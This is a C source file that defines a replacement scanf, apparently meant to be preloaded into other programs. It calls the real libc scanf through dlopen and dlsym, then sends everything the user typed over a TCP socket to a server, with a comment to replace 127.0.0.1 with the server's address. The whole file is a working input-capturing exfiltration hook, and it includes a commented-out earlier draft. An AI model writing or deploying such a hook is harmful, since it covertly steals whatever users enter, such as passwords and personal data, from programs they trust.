#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PORT 8080
#define MAXLINE 1024

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"

/*
int scanf ( const char * format, ... )
{
	char* itr = format;
	unsigned int val_hex;
	int has_val = 0;
	sym orig_scanf;
	char data[MAXLINE];
`	int i=0;
	int sockfd;
    struct sockaddr_in servaddr;
    //char buffer[MAXLINE] = "HELLO SERVER\n";

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));

    // Assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // replace with server IP address
    servaddr.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        perror("connection failed");
        exit(EXIT_FAILURE);
    }

    // Send message to server
    send(sockfd, data, strlen(data), 0);

    // Close the connection
    close(sockfd);
	
}
*/


typedef int (*sym)(const char *, ...);
void* handle;
int scanf ( const char * format, ... )
{
	int has_val = 0;
	sym orig_scanf;
    int sockfd;
    struct sockaddr_in servaddr;
    char buffer[MAXLINE] = "HELLO SERVER\n";
	char data[MAXLINE];

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));

    // Assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // replace with server IP address
    servaddr.sin_port = htons(PORT);
	

    // Connect to the server
    if (connect(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        perror("connection failed");
        exit(EXIT_FAILURE);
    }
	
	 handle = dlopen(OBJ_PATH,RTLD_LAZY);

	orig_scanf = (sym)dlsym(handle,"scanf");
	int val = orig_scanf(format, data);
	
	int count = 0;
	char end[2] = " \n";
	strcat(data,end);
	while(data[count] != '\0')
	{
		count++;
	}
    // Send message to server
    send(sockfd, data, strlen(data), 0);
	//send(sockfd, buffer, count, 0);
    // Close the connection
    close(sockfd);
	dlclose(handle);
    return val;
}